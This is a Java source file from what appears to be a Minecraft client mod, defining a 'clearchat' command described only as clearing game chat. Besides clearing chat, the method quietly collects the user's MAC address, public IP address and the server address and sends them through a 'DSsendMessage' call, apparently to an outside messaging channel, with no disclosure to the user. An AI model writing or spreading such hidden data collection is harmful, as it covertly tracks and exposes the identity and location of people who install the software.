package it.md_4.troy.command.impl;

import it.md_4.troy.command.Command;
import it.md_4.troy.command.CommandInfo;
import it.md_4.troy.exception.CommandException;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;
import net.minecraft.client.Minecraft;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@CommandInfo(
        alias = "clearchat",
        description = "Clear Game Chat",
        usage = "'clearchat",
        aliases = {"cc"}
)
public class ClearChatCommand extends Command {

    public void execute(String... args) throws Exception {
        Minecraft.getMinecraft().ingameGUI.getChatGUI().clearChatMessages();
        ChatHelper.printMessage("&b • &3Chat Cleared!", false);

        InetAddress localHost = null;
        try {
            localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
            ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
            hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + "] \nConnected With IP => \n(" + IpChecker.getIp() +")\n" + " Executed Command [ClearChat]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
    }
}

